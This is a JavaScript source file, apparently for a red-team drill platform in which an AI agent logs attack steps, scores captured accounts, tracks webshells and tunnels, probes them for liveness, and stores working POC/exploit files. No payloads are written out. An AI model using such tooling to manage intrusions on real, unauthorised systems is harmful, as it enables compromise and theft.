    md.push('# 攻击得分链路复现报告 — ' + ((meta && meta.target_name) || id), '')
    md.push('合计 **' + summary.points + ' 分** · ' + summary.count + ' 项得分 · ' +
      summary.withRequests + '/' + summary.count + ' 项带原始请求' +
      (summary.missingRequests > 0 ? '（' + summary.missingRequests + ' 项缺原始请求）' : ''), '')
    if (summary.selfCreatedExcluded > 0) {
      md.push('> 另有 ' + summary.selfCreatedExcluded + ' 条「自己注册/自建账号」的记录不计分、不在本报告中（演练得分针对拿到别人已有的账号与权限）。', '')
    }
    const CIRCLED = ['①', '②', '③', '④', '⑤', '⑥', '⑦', '⑧', '⑨', '⑩', '⑪', '⑫', '⑬', '⑭', '⑮', '⑯', '⑰', '⑱', '⑲', '⑳']
    const NUMS = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20']
    for (const st of stages) {
      md.push('---', '')
      md.push('## ' + (CIRCLED[st.ordinal - 1] || '') + ' ' + st.name + '　+' + st.points + ' 分（累计 ' + st.cumulative + ' 分）', '')
      if (st.goal) md.push('> ' + st.goal, '')
      let n = 0
      for (const x of st.items) {
        n += 1
        md.push('### ' + (NUMS[n - 1] || n) + '. ' + x.point_name + '　+' + x.points + ' 分', '')
        if (x.target) md.push('- **目标**：' + x.target)
        if (x.gained) md.push('- **拿到**：' + x.gained)
        if (x.evidence && String(x.evidence).replace(/\n+/g, ' ').trim() !== String(x.gained || '').trim()) {
          md.push('- **结果**：' + String(x.evidence).replace(/\n+/g, ' ').slice(0, 300))
        }
        if (x.vuln) md.push('- **利用的漏洞**：' + (x.vuln.cve ? x.vuln.cve + ' — ' : '') + x.vuln.title)
        md.push('')
        if (x.requests.length === 0) {
          md.push('> ⚠️ 没有原始请求记录，无法直接复现；请补 `redteam_http_evidence_add`。', '')
          continue
        }
        x.requests.forEach((r, ri) => {
          md.push('**复现请求 ' + (ri + 1) + '（可直接粘贴进 Yakit Repeater）**' + (r.source === 'auto' ? ' — 按目标路径自动匹配，请核对' : ''), '')
          if (r.request) { md.push('```http', String(r.request).replace(/\r/g, '').trim(), '```', '') }
          else if (r.url) { md.push('```http', (r.method || 'GET') + ' ' + r.url + ' HTTP/1.1', '```', '') }
          if (r.response) { md.push('响应摘要：', '```http', String(r.response).replace(/\r/g, '').trim().slice(0, 1200), '```', '') }
          md.push('')
        })
      }
    }
    return { items, stages, summary, markdown: md.join('\n'), target: (meta && meta.target_name) || id }
  }

  /**
   * 得分链路：把 score_hit 按时间拉平成一条链，只含"得分"相关的东西，不掺任何信息收集流水账。
   * 攻击链页面的「得分链路」视图用它。
   */
  scoreChain(id, f = {}) {
    const db = this.db(id)
    const limit = Math.min(Number(f.limit) || 500, 2000)
    const items = db.prepare(`SELECT h.id, h.point_id, h.asset_id, h.vuln_id, h.step_id, h.target,
        h.evidence, h.note, h.self_created, h.recorded_by, h.recorded_at,
        p.code, p.name AS point_name, p.category, p.points, p.enabled, h.stage_code,
        a.ip AS asset_ip, v.title AS vuln_title, v.cve AS vuln_cve
      FROM score_hit h
      LEFT JOIN score_point p ON p.id = h.point_id
      LEFT JOIN asset a ON a.id = h.asset_id
      LEFT JOIN vuln v ON v.id = h.vuln_id
      ORDER BY h.recorded_at, h.id LIMIT ?`).all(limit)
    /* 每一步"靠什么动作拿到的"：① 显式关联的步骤 ② 同一资产上时间最近的步骤（标注为推断） */
    const stepById = new Map(db.prepare('SELECT id, seq, stage, title, detail, asset_id, point_id, recorded_at FROM attack_step').all().map((x) => [x.id, x]))
    const stepsByAsset = new Map()
    for (const st of stepById.values()) {
      if (st.asset_id === null || st.asset_id === undefined) continue
      if (!stepsByAsset.has(st.asset_id)) stepsByAsset.set(st.asset_id, [])
      stepsByAsset.get(st.asset_id).push(st)
    }
    for (const list of stepsByAsset.values()) list.sort((a, b) => String(a.recorded_at).localeCompare(String(b.recorded_at)))
    for (const it of items) {
      let step = it.step_id !== null && it.step_id !== undefined ? stepById.get(it.step_id) : undefined
      let inferred = false
      if (step === undefined) {
        step = Array.from(stepById.values()).find((x) => x.point_id === it.point_id && x.asset_id === it.asset_id)
      }
      if (step === undefined && it.asset_id !== null && it.asset_id !== undefined) {
        const cands = (stepsByAsset.get(it.asset_id) || []).filter((x) => String(x.recorded_at) <= String(it.recorded_at))
        if (cands.length > 0) { step = cands[cands.length - 1]; inferred = true }
      }
      it.action = step === undefined ? null : { id: step.id, seq: step.seq, stage: step.stage, title: step.title, detail: step.detail }
      it.action_inferred = inferred
    }
    /* 计分口径：同类得分不设上限，按命中次数累加。
       自己注册/自建的账号不计分（只留过程），因此也不进累计分。 */
    const seenOf = new Map()
    for (const it of items) {
      it.self_created = Number(it.self_created) === 1
      const seen = seenOf.get(it.point_id) || 0
      if (!it.self_created) seenOf.set(it.point_id, seen + 1)
      it.nth_of_point = seen + 1
      it.counted = it.self_created !== true
    }
    /* 按得分点聚合出"哪些还没拿下"，方便一眼看出缺口 */
    const points = db.prepare('SELECT id, code, name, category, points, enabled FROM score_point ORDER BY sort_order, id').all()
    const hitPointIds = new Set(items.map((x) => x.point_id))
    const achieved = points.filter((p) => hitPointIds.has(p.id) && p.enabled === 1)
    const missing = points.filter((p) => !hitPointIds.has(p.id) && p.enabled === 1)
    /* ── 攻击链：按「攻击面位置」把得分串成五阶段，并给出累计分 ────────────── */
    const assetIds = Array.from(new Set(items.map((x) => x.asset_id).filter((v) => v !== null && v !== undefined)))
    const assetInfo = new Map()
    if (assetIds.length > 0) {
      const ph = assetIds.map(() => '?').join(',')
      const rows = db.prepare(`SELECT a.id, a.ip, a.segment_cidr, COALESCE(a.scope, (${SCOPE_SQL})) AS scope, a.state, a.priority,
          (SELECT COUNT(*) FROM port p WHERE p.asset_id = a.id AND p.state = 'open') AS open_ports,
          (SELECT COUNT(*) FROM vuln v WHERE v.asset_id = a.id AND v.status IN ('confirmed','exploited')) AS vulns
        FROM asset a WHERE a.id IN (${ph})`).all(...assetIds)
      for (const row of rows) assetInfo.set(row.id, row)
    }
    /* 每条得分落在哪个阶段：自动推导（显式 stage_code > 类型特判 > 资产内外网 > target 地址） */
    for (const it of items) {
      const info = it.asset_id !== null && it.asset_id !== undefined ? assetInfo.get(it.asset_id) : undefined
      it.stage_code = scoreStageOf(
        { stage_code: it.stage_code, code: it.code, target: it.target },
        info ? info.scope : undefined,
      )
    }
    const assetChip = (id) => {
      const a = assetInfo.get(id)
      if (a === undefined) return null
      return {
        id: a.id, ip: a.ip, segment_cidr: a.segment_cidr, scope: a.scope, state: a.state,
        priority: a.priority, open_ports: a.open_ports, vulns: a.vulns,
      }
    }
    /* 攻击步骤按阶段计数（攻击链只看"各阶段有多少动作"，不展开明细） */
    const stepsByStage = new Map()
    try {
      for (const row of db.prepare('SELECT stage, stage_code FROM attack_step LIMIT 5000').all()) {
        const code = row.stage_code || LEGACY_STAGE_MAP[row.stage] || 'recon'
        stepsByStage.set(code, (stepsByStage.get(code) || 0) + 1)
      }
    } catch { /* ignore */ }
    /* 会话隧道表的真实隧道：属于「边界突破」阶段的实锤 */
    let tunnels = []
    try {
      tunnels = db.prepare('SELECT id, kind, listen, entry, reach, entry_kind, status, note FROM tunnel ORDER BY id DESC LIMIT 50').all()
        .map((t) => Object.assign({}, t, { legit: tunnelIsLegit(t.entry_kind), entry_kind_label: TUNNEL_ENTRY_KINDS[t.entry_kind] || null }))
    } catch { tunnels = [] }
    /* 只有真正跨越靶标边界的隧道才算"边界突破"的实锤；自己 VPS/自建服务器上开的不算 */
    const legitTunnels = tunnels.filter((t) => t.legit === true)
    const selfOnlyTunnels = tunnels.filter((t) => t.legit === false)

    const stageDefs = this.listStages(id)
    let cumulative = 0
    const stages = stageDefs.map((st, si) => {
      const sItems = items.filter((x) => x.stage_code === st.code)
      const pts = sItems.reduce((n, x) => n + (x.counted ? (x.points || 0) : 0), 0)
      cumulative += pts
      /* 本阶段涉及的资产（去重）。信息收集阶段给"所有拿到分数的资产"，其余阶段给自己的 */
      const ids = st.code === 'recon'
        ? Array.from(new Set(items.map((x) => x.asset_id).filter((v) => v !== null && v !== undefined)))
        : Array.from(new Set(sItems.map((x) => x.asset_id).filter((v) => v !== null && v !== undefined)))
      const assets = ids.map(assetChip).filter(Boolean).map((a) => {
        const mine = items.filter((x) => x.asset_id === a.id)
        return Object.assign({}, a, {
          points: mine.reduce((n, x) => n + (x.counted ? (x.points || 0) : 0), 0),
          hits: mine.length,
          /* 该资产的分落在哪个阶段（同一资产可能被内外网两侧都打到） */
          stage_code: mine.length > 0 ? mine[0].stage_code : st.code,
        })
      }).sort((a, b) => b.points - a.points || b.hits - a.hits)
      return Object.assign({}, st, {
        ordinal: si + 1,
        items: sItems,
        hits: sItems.length,
        counted: sItems.filter((x) => x.counted).length,
        points: pts,
        cumulative: cumulative,
        assets: assets,
        assetCount: assets.length,
        tunnels: st.code === 'boundary' ? legitTunnels : [],
        tunnels_self_only: st.code === 'boundary' ? selfOnlyTunnels : [],
        steps: stepsByStage.get(st.code) || 0,
      })
    })

    const scores = this.listScorePoints(id)
    return {
      items,
      stages,
      achieved,
      missing,
      summary: {
        hits: items.length,
        /* 计分口径与得分面板一致：同类得分不设上限，按命中次数累加 */
        points: scores.summary.achievedPoints,
        totalPoints: scores.summary.totalPoints,
        countedHits: scores.summary.countedHits,
        achievedCount: achieved.length,
        missingCount: missing.length,
        missingPoints: missing.reduce((n, p) => n + (p.potential || p.points || 0), 0),
        selfCreatedHits: scores.summary.selfCreatedHits || 0,
        tunnelsLegit: legitTunnels.length,
        tunnelsSelfOnly: selfOnlyTunnels.length,
      },
    }
  }

  /** 会话总览：给界面和提示词用的一屏摘要（含在线/离线统计）。 */
  sessionSummary(id) {
    const db = this.db(id)
    const shells = db.prepare(`SELECT w.*, a.ip AS asset_ip FROM webshell w
      LEFT JOIN asset a ON a.id = w.asset_id ORDER BY w.id DESC`).all()
    const tunnels = db.prepare(`SELECT t.*, a.ip AS asset_ip, w.url AS webshell_url FROM tunnel t
      LEFT JOIN asset a ON a.id = t.asset_id LEFT JOIN webshell w ON w.id = t.webshell_id ORDER BY t.id DESC`).all()
      .map((t) => Object.assign({}, t, { legit: tunnelIsLegit(t.entry_kind), entry_kind_label: TUNNEL_ENTRY_KINDS[t.entry_kind] || null }))
    const creds = db.prepare('SELECT COUNT(*) AS n FROM credential').get()
    const access = db.prepare('SELECT COUNT(*) AS n FROM access_session').get()
    return {
      webshells: shells, tunnels,
      totals: {
        webshells: shells.length,
        webshellsOnline: shells.filter((s) => s.status === 'online').length,
        tunnels: tunnels.length,
        tunnelsActive: tunnels.filter((s) => s.status === 'active').length,
        /* 只有跨越靶标边界的通道才算突破凭证（自己 VPS/自建服务器上开的不算） */
        tunnelsLegit: tunnels.filter((s) => s.legit === true).length,
        tunnelsSelfOnly: tunnels.filter((s) => s.legit === false).length,
        credentials: creds ? creds.n : 0,
        access: access ? access.n : 0,
      },
    }
  }

  /**
   * 实测连通性（host 平面专有：智能体跑在沙箱里，只有这里能直接发起连接）。
   * WebShell 发一次不带参数的 GET；隧道做一次 TCP 连接。
   * 结果回写 status / last_check / latency_ms / check_note。
   */
  async probeSessions(id, options = {}) {
    const timeout = Math.min(Math.max(Number(options.timeoutMs) || 6000, 1000), 20000)
    const out = { webshells: [], tunnels: [], checkedAt: nowIso() }

    for (const s of this.listWebshells(id, { limit: 500 })) {
      const started = Date.now()
      let status = 'offline'
      let note = ''
      try {
        const controller = new AbortController()
        const timer = setTimeout(() => controller.abort(), timeout)
        const res = await fetch(s.url, { method: 'GET', redirect: 'manual', signal: controller.signal })
        clearTimeout(timer)
        status = res.status < 500 ? 'online' : 'offline'
        note = `HTTP ${res.status}`
      } catch (error) {
        note = error && error.name === 'AbortError' ? `超时 >${timeout}ms` : String((error && error.message) || error).slice(0, 160)
      }
      const latency = Date.now() - started
      try {
        this.updateWebshell(id, s.id, { status, last_check: nowIso(), latency_ms: latency, check_note: note })
      } catch { /* ignore */ }
      out.webshells.push({ id: s.id, url: s.url, status, note, latency_ms: latency })
    }

    for (const t of this.listTunnels(id, { limit: 500 })) {
      const target = String(t.listen || '').replace(/^socks5:\/\//, '').replace(/^https?:\/\//, '')
      const started = Date.now()
      let status = 'down'
      let note = ''
      if (target === '') {
        note = '缺少 listen 地址，无法探测'
      } else {
        const idx = target.lastIndexOf(':')
        const host = idx > 0 ? target.slice(0, idx) : '127.0.0.1'
        const port = Number(idx > 0 ? target.slice(idx + 1) : target)
        if (!Number.isFinite(port) || port <= 0) {
          note = `无法解析端口：${t.listen}`
        } else {
          note = await new Promise((resolve) => {
            let done = false
            const socket = tcpConnect({ host, port })
            const finish = (ok, text) => {
              if (done) return
              done = true
              try { socket.destroy() } catch { /* ignore */ }
              resolve(ok ? '' : text)
            }
            socket.setTimeout(timeout)
            socket.on('connect', () => { status = 'active'; finish(true, '') })
            socket.on('timeout', () => { finish(false, `超时 >${timeout}ms`) })
            socket.on('error', (error) => { finish(false, String((error && error.code) || (error && error.message) || error).slice(0, 120)) })
          })
        }
      }
      const latency = Date.now() - started
      try {
        this.updateTunnel(id, t.id, { status, last_check: nowIso(), latency_ms: latency, check_note: note })
      } catch { /* ignore */ }
      out.tunnels.push({ id: t.id, kind: t.kind, listen: t.listen, status, note, latency_ms: latency })
    }
    return out
  }

  /**
   * 攻击图谱：在资产拓扑上叠加漏洞与已控制资产。
   * 节点 kind：segment / asset（meta.vulns 按严重级计数、meta.owned） / vuln（已确认）。
   * 边 relation：contains / exposes / resolves / has_vuln。
   */
  attackGraph(id, f = {}) {
    const base = this.graph(id, f)
    const db = this.db(id)
    const nodes = base.nodes.slice()
    const edges = base.edges.slice()
    const byId = new Map(nodes.map((n) => [n.id, n]))

    const vulnRows = db.prepare(`SELECT asset_id, severity, COUNT(*) AS n FROM vuln
      WHERE asset_id IS NOT NULL GROUP BY asset_id, severity`).all()
    for (const row of vulnRows) {
      const node = byId.get(`asset:${row.asset_id}`)
      if (node === undefined) continue
      node.meta = node.meta || {}
      node.meta.vulns = node.meta.vulns || {}
      node.meta.vulns[row.severity] = row.n
    }
    const owned = db.prepare('SELECT DISTINCT asset_id FROM access_session WHERE asset_id IS NOT NULL').all()
    for (const row of owned) {
      const node = byId.get(`asset:${row.asset_id}`)
      if (node !== undefined) { node.meta = node.meta || {}; node.meta.owned = true }
    }
    const confirmed = db.prepare(`SELECT v.id, v.asset_id, v.cve, v.title, v.severity, v.status
      FROM vuln v WHERE v.status IN ('confirmed','exploited') AND v.asset_id IS NOT NULL
      ORDER BY CASE v.severity WHEN 'critical' THEN 0 WHEN 'high' THEN 1 WHEN 'medium' THEN 2 ELSE 3 END LIMIT 200`).all()
    for (const v of confirmed) {
      const nodeId = `vuln:${v.id}`
      nodes.push({ id: nodeId, kind: 'vuln', label: v.cve || (v.title || '').slice(0, 18), meta: { severity: v.severity, status: v.status, title: v.title } })
      edges.push({ source: `asset:${v.asset_id}`, target: nodeId, relation: 'has_vuln' })
    }
    return { nodes, edges, summary: this.vulnStats(id) }
  }

  /* ---------- 域名维度 / Web 资产 ---------- */

  /**
   * 按域名聚合资产：域名 → 该域名下的资产清单（无域名的资产归入「(未关联域名)」）。
   * @param f - `{ cidr? }` 只看某个 C 段（与左侧 C 段选择保持一致，避免维度串台）。
   */
  domainIndex(id, f = {}) {
    const db = this.db(id)
    const assets = (f.cidr
      ? db.prepare('SELECT id, ip, segment_cidr, state, primary_name FROM asset WHERE segment_cidr = ? ORDER BY ip_int').all(f.cidr)
      : db.prepare('SELECT id, ip, segment_cidr, state, primary_name FROM asset ORDER BY ip_int').all())
    const names = db.prepare('SELECT asset_id, name, kind, provenance FROM asset_name').all()
    const byAsset = new Map()
    for (const n of names) {
      if (!byAsset.has(n.asset_id)) byAsset.set(n.asset_id, [])
      byAsset.get(n.asset_id).push(n)
    }
    const groups = new Map()
    for (const a of assets) {
      const domains = new Set()
      if (a.primary_name) domains.add(a.primary_name)
      for (const n of byAsset.get(a.id) || []) domains.add(n.name)
      if (domains.size === 0) domains.add('(未关联域名)')
      for (const domain of domains) {
        if (!groups.has(domain)) groups.set(domain, [])
        groups.get(domain).push({ id: a.id, ip: a.ip, segment: a.segment_cidr, state: a.state, names: (byAsset.get(a.id) || []).map((n) => n.name) })
      }
    }
    return Array.from(groups.entries())
      .map(([domain, list]) => ({ domain, count: list.length, assets: list }))
      .sort((a, b) => b.count - a.count || a.domain.localeCompare(b.domain))
  }

  /** Web 资产清单：有 URL/标题或常见 Web 端口的资产。 */
  listWeb(id, f = {}) {
    const db = this.db(id)
    const rows = db.prepare(`SELECT p.id AS port_id, p.port, p.proto, p.url, p.title, p.banner, p.provenance, p.tool,
        a.id AS asset_id, a.ip, a.segment_cidr, a.primary_name, a.state,
        s.name AS service, s.product, s.version
      FROM port p JOIN asset a ON a.id = p.asset_id
      LEFT JOIN service s ON s.port_id = p.id
      WHERE p.state = 'open' AND (
        p.url IS NOT NULL OR p.title IS NOT NULL
        OR s.name IN ('http', 'https', 'http-proxy', 'ssl/http')
        OR p.port IN (80, 81, 443, 8000, 8001, 8080, 8081, 8082, 8443, 8888, 9090, 7001, 9000, 9443)
      )
      ORDER BY a.ip_int, p.port`).all()
    const filtered = f.cidr ? rows.filter((r) => r.segment_cidr === f.cidr) : rows
    const limited = f.limit ? filtered.slice(0, Number(f.limit)) : filtered
    return { total: filtered.length, items: limited }
  }

  /* ---------- HTTP 证据（Burp / Yakit 可复现） ---------- */

  addHttpEvidence(id, e = {}) {
    const db = this.db(id)
    const result = db.prepare(`INSERT INTO http_evidence(vuln_id, asset_id, label, method, url, status, request, response, note, captured_by, captured_at)
      VALUES(?,?,?,?,?,?,?,?,?,?,?)`).run(
      e.vuln_id ?? null, e.asset_id ?? null, e.label ?? null, e.method ?? 'GET', e.url ?? null,
      e.status ?? null, e.request ?? null, e.response ?? null, e.note ?? null,
      e.captured_by ?? null, nowIso(),
    )
    return { id: Number(result.lastInsertRowid) }
  }

  listHttpEvidence(id, f = {}) {
    const db = this.db(id)
    const where = []
    const args = []
    if (f.vuln_id !== undefined && f.vuln_id !== null) { where.push('vuln_id = ?'); args.push(Number(f.vuln_id)) }
    if (f.asset_id !== undefined && f.asset_id !== null) { where.push('asset_id = ?'); args.push(Number(f.asset_id)) }
    const clause = where.length ? 'WHERE ' + where.join(' AND ') : ''
    const limit = Math.min(Number(f.limit) || 100, 500)
    return db.prepare(`SELECT * FROM http_evidence ${clause} ORDER BY id DESC LIMIT ?`).all(...args, limit)
  }

  /* ---------- 攻击链 ---------- */

  /**
   * 写一步攻击链。如果这一步拿到了分，带上 point_code（或 point_id）即可：
   * 服务端会自动记一条 score_hit 并把两者互相挂上，避免"写了步骤忘了记分/记了分说不清怎么拿的"。
   */
  addChainStep(id, s = {}) {
    const db = this.db(id)
    const next = (db.prepare('SELECT COALESCE(MAX(seq), 0) + 1 AS n FROM attack_step').get() || { n: 1 }).n
    let pointId = s.point_id !== undefined && s.point_id !== null ? Number(s.point_id) : null
    if (pointId === null && s.point_code) {
      const row = db.prepare('SELECT id FROM score_point WHERE code = ?').get(String(s.point_code))
      if (row !== undefined) pointId = row.id
    }
    const seq = s.seq ?? next
    const legacyStage = s.stage ?? 'other'
    /* 只有这 5 个阶段 code 会被攻击链页面分桶；其它值（含已废弃的 external/foothold/tunnel/privilege）
       写了等于步骤不落在任何阶段，所以退回按老 stage 兜底，并显式告警。 */
    let stageWarning = null
    let stageCode
    if (typeof s.stage_code === 'string' && s.stage_code.trim() !== '') {
      const wanted = s.stage_code.trim()
      if (VALID_STAGE_CODES.includes(wanted)) {
        stageCode = wanted
      } else {
        stageCode = LEGACY_STAGE_MAP[legacyStage] ?? 'recon'
        stageWarning = '无效的 stage_code="' + wanted + '"（已忽略）：只接受 ' + VALID_STAGE_CODES.join('/')
          + '；本步按 stage 兜底落到 ' + stageCode + '。'
      }
    } else {
      stageCode = LEGACY_STAGE_MAP[legacyStage] ?? 'recon'
    }
    const result = db.prepare(`INSERT INTO attack_step(seq, stage, stage_code, title, detail, asset_id, vuln_id, access_id, point_id, evidence_ref, recorded_by, recorded_at)
      VALUES(?,?,?,?,?,?,?,?,?,?,?,?)`).run(
      seq, legacyStage, stageCode, s.title ?? '', s.detail ?? null,
      s.asset_id ?? null, s.vuln_id ?? null, s.access_id ?? null, pointId, s.evidence_ref ?? null,
      s.recorded_by ?? null, nowIso(),
    )
    const stepId = Number(result.lastInsertRowid)
    let hit = null
    let scoreHint = null
    /* 带 point_code 且给了 evidence → 顺手记分（同一次调用完成"动作 + 得分"） */
    if (pointId !== null && typeof s.evidence === 'string' && s.evidence.trim() !== '') {
      try {
        hit = this.addScoreHit(id, {
          point_id: pointId, asset_id: s.asset_id ?? null, vuln_id: s.vuln_id ?? null, step_id: stepId,
          target: s.target ?? null, evidence: s.evidence, note: s.note ?? null, recorded_by: s.recorded_by ?? null,
          /* 自己注册/自建的账号不计分（只留过程） */
          self_created: s.self_created,
        })
      } catch (error) {
        /* 步骤照常入库，但把原因回给模型——静默吞掉会让"记了分"其实是空的 */
        scoreHint = '步骤已入库，但记分失败：' + (error && error.message ? error.message : String(error))
        }
    } else if (pointId !== null) {
      scoreHint = '带了 point_code 但没给 evidence，本次**没有记分**（步骤已入库）：需要记分请补 redteam_score_hit，evidence 只写结果（目标资产 + 账号/权限/数据量）。'
    }
    return { id: stepId, seq: seq, stage_code: stageCode, point_id: pointId, hit: hit, score_hint: scoreHint, stage_hint: stageWarning }
  }

  listChain(id) {
    return this.db(id).prepare(`SELECT s.*, a.ip AS asset_ip, v.title AS vuln_title, v.severity AS vuln_severity, v.cve AS vuln_cve
      FROM attack_step s
      LEFT JOIN asset a ON a.id = s.asset_id
      LEFT JOIN vuln v ON v.id = s.vuln_id
      ORDER BY s.seq, s.id`).all()
  }

  /* ---------- 攻击文件（只收录实际生效的脚本/POC/EXP） ---------- */

  /** 攻击文件根目录：<靶标>/attack-files/<目标>/… */
  attackFilesDirOf(id) { return join(this.dirOf(id), 'attack-files') }

  /**
   * 保存一个攻击文件到「目标文件夹」并登记。evidence 必填——只收录实际生效的东西。
   * @param id - 靶标 id。
   * @param f - `{ target, name, kind, content|path, description, evidence, asset_id?, vuln_id?, created_by? }`
   */
  addAttackFile(id, f = {}) {
    const db = this.db(id)
    const target = String(f.target || '').trim()
    if (target === '') throw new Error('attack file target required（IP / URL / C 段）')
    const name = String(f.name || '').trim().replace(/[/\\]/g, '-')
    if (name === '') throw new Error('attack file name required')
    const evidence = String(f.evidence || '').trim()
    if (evidence === '') throw new Error('attack file evidence required：只收录实际生效的脚本/POC/EXP，请写明验证效果')
    const slug = slugTarget(target)
    const dir = join(this.attackFilesDirOf(id), slug)
    mkdirSync(dir, { recursive: true })
    const filePath = join(dir, name)
    if (typeof f.content === 'string' && f.content.length > 0) {
      writeFileSync(filePath, f.content, 'utf8')
    } else if (typeof f.path === 'string' && f.path.length > 0) {
      const src = isAbsolute(f.path) ? f.path : join(this.dirOf(id), f.path)
      if (!existsSync(src)) throw new Error('source path not found: ' + f.path)
      copyFileSync(src, filePath)
    } else {
      throw new Error('attack file content or path required')
    }
    const kind = ['poc', 'exp', 'script', 'wordlist', 'other'].includes(f.kind) ? f.kind : 'script'
    db.prepare(`INSERT INTO attack_file(target, target_kind, name, kind, path, description, evidence, asset_id, vuln_id, created_by, created_at)
      VALUES(?,?,?,?,?,?,?,?,?,?,?)
      ON CONFLICT(target, name) DO UPDATE SET
        kind = excluded.kind, path = excluded.path, description = excluded.description,
        evidence = excluded.evidence, created_at = excluded.created_at`).run(
      target, f.target_kind ?? null, name, kind, filePath,
      f.description ?? null, evidence, f.asset_id ?? null, f.vuln_id ?? null,
      f.created_by ?? null, nowIso(),
    )
    return { target, name, kind, path: filePath }
  }

  listAttackFiles(id, f = {}) {
    const db = this.db(id)
    const where = []
    const args = []
    if (f.target) { where.push('target = ?'); args.push(f.target) }
    if (f.kind) { where.push('kind = ?'); args.push(f.kind) }
    const clause = where.length ? 'WHERE ' + where.join(' AND ') : ''
    return db.prepare(`SELECT * FROM attack_file ${clause} ORDER BY target, name`).all(...args)
  }

  /** 攻击文件按目标分组（每个 IP / URL / C 段一个文件夹）。 */
  attackFileTree(id) {
    const groups = new Map()
    for (const row of this.listAttackFiles(id, {})) {
      if (!groups.has(row.target)) groups.set(row.target, { target: row.target, folder: slugTarget(row.target), count: 0, files: [] })
      const g = groups.get(row.target)
      g.files.push(row)
      g.count++
    }
    return Array.from(groups.values()).sort((a, b) => b.count - a.count || a.target.localeCompare(b.target))
  }

  readAttackFile(id, fileId) {
    const row = this.db(id).prepare('SELECT * FROM attack_file WHERE id = ?').get(Number(fileId))
    if (row === undefined) return undefined
    let content = ''
    try { content = readFileSync(row.path, 'utf8') } catch { content = '（文件已不存在：' + row.path + '）' }
    return { ...row, content }
  }

  /* ---------- 知识库：通用 POC / EXP（全局共享，跨靶标复用） ---------- */

  knowledgePath() { return join(this.root, 'knowledge.db') }

  /** 找本机 nuclei 模板目录（装了模板才有；找不到返回 undefined）。 */
  nucleiTemplatesDir() {
    const candidates = [
      join(this.root, 'toolkit', 'nuclei-templates'),
      join(homedir(), '.local', 'nuclei-templates'),
      join(homedir(), 'nuclei-templates'),
      '/usr/share/nuclei-templates',
      '/opt/nuclei-templates',
    ]
    return candidates.find((p) => existsSync(p))
  }

  #nucleiIndexPath() { return join(this.pocsDirOf(), '.nuclei-index.json') }

  /**
   * 模板索引（按需构建 + 落盘缓存）：13k 个 yaml 逐个解析太慢，所以只抽
   * path / name / severity / tags 这几个检索字段，构建一次后一直复用。
   */
  #nucleiIndex(force) {
    const dir = this.nucleiTemplatesDir()
    if (dir === undefined) return { dir: null, items: [] }
    const cachePath = this.#nucleiIndexPath()
    if (force !== true && existsSync(cachePath)) {
      try {
        const cached = JSON.parse(readFileSync(cachePath, 'utf8'))
        /* 目录没变、且缓存不超过 7 天就直接用 */
        const fresh = cached && cached.dir === dir && Array.isArray(cached.items)
          && (Date.now() - Number(cached.built_at || 0) < 7 * 24 * 3600 * 1000)
        if (fresh) return { dir, items: cached.items, cached: true }
      } catch { /* 缓存坏了就重建 */ }
    }
    const items = []
    const walk = (base, rel) => {
      let entries = []
      try { entries = readdirSync(join(base, rel), { withFileTypes: true }) } catch { return }
      for (const e of entries) {
        const next = rel === '' ? e.name : rel + '/' + e.name
        if (e.isDirectory()) { walk(base, next); continue }
        if (!/\.ya?ml$/i.test(e.name)) continue
        let head = ''
        try { head = readFileSync(join(base, next), 'utf8').slice(0, 2000) } catch { continue }
        const pick = (re) => { const m = re.exec(head); return m === null ? '' : String(m[1]).trim().replace(/^["']|["']$/g, '') }
        items.push([
          next,
          pick(/^\s*name:\s*(.+)$/m),
          pick(/^\s*severity:\s*(.+)$/m),
          pick(/^\s*tags:\s*(.+)$/m),
        ])
      }
    }
    walk(dir, '')
    try {
      mkdirSync(this.pocsDirOf(), { recursive: true })
      writeFileSync(cachePath, JSON.stringify({ built_at: Date.now(), dir, items }), 'utf8')
    } catch { /* 缓存写不进去不影响检索 */ }
    return { dir, items, cached: false }
  }

  /** 模板库概览（界面与智能体"先查现成的"都能用）。 */
  templateStats() {
    const { dir, items } = this.#nucleiIndex()
    const cve = items.filter((x) => /cve-\d{4}-\d+/i.test(x[0])).length
    return { dir: dir || null, total: items.length, cve }
  }

  /**
   * 在本机 nuclei 模板库里检索：CVE 编号按文件名就能命中，组件/关键字再匹配 name 与 tags。
   * 这是"知识库里没有、但本机其实已有现成 POC"的那一层，先查它能省掉一轮互联网检索。
   */
  searchTemplates(q, limit = 40) {
    const { dir, items } = this.#nucleiIndex()
    if (dir === null) return { dir: null, total: 0, items: [] }
    const raw = String(q || '').trim()
    if (raw === '') return { dir, total: items.length, items: [] }
    const needle = raw.toLowerCase()
    const out = []
    for (const [path, name, severity, tags] of items) {
      const hay = (path + ' ' + name + ' ' + tags).toLowerCase()
      if (hay.includes(needle)) out.push({ path, name, severity, tags })
      if (out.length >= limit) break
    }
    return { dir, total: items.length, items: out }
  }


  pocsDirOf() { return join(this.root, 'pocs') }

  /** 打开（必要时创建）全局知识库。与靶标库分开，跨靶标共享。 */
  kb() {
    if (this.kbHandle) return this.kbHandle
    mkdirSync(this.root, { recursive: true })
    mkdirSync(this.pocsDirOf(), { recursive: true })
    const handle = new DatabaseSync(this.knowledgePath())
    handle.exec(KNOWLEDGE_DDL)
    this.kbHandle = handle
    return handle
  }

  #reindexPoc(db, pocId) {
    db.prepare('DELETE FROM poc_fts WHERE poc_id = ?').run(String(pocId))
    const p = db.prepare('SELECT * FROM poc WHERE id = ?').get(pocId)
    if (!p) return
    db.prepare('INSERT INTO poc_fts(poc_id, title, cve, component, versions, tags, description, content) VALUES(?,?,?,?,?,?,?,?)')
      .run(String(p.id), p.title, p.cve || '', p.component || '', p.versions || '', p.tags || '', p.description || '', p.content || '')
  }

  /**
   * 落库一份通用 POC/EXP。同名（code）会合并刷新，便于"同一漏洞的新版本 POC"覆盖旧版。
   * @param p - `{ title, kind, cve, component, versions, severity, language, source, source_url,
   *               description, usage, content|path, verified, verified_note, tags, created_by }`
   */
  savePoc(p = {}) {
    const db = this.kb()
    const title = String(p.title || '').trim()
    if (title === '') throw new Error('poc.title required（写清是什么漏洞/组件的 POC）')
    const kind = POC_KINDS.includes(p.kind) ? p.kind : (String(p.kind || '').toLowerCase() === 'exp' ? 'exp' : 'poc')
    const source = POC_SOURCES.includes(p.source) ? p.source : 'self'
    const code = String(p.code || '').trim() || slugPoc(title, p.cve)
    const dir = join(this.pocsDirOf(), code)
    mkdirSync(dir, { recursive: true })

    /* 正文：优先用传入 content，其次从 path 读；两者都没有则只登记元数据 */
    let content = typeof p.content === 'string' ? p.content : ''
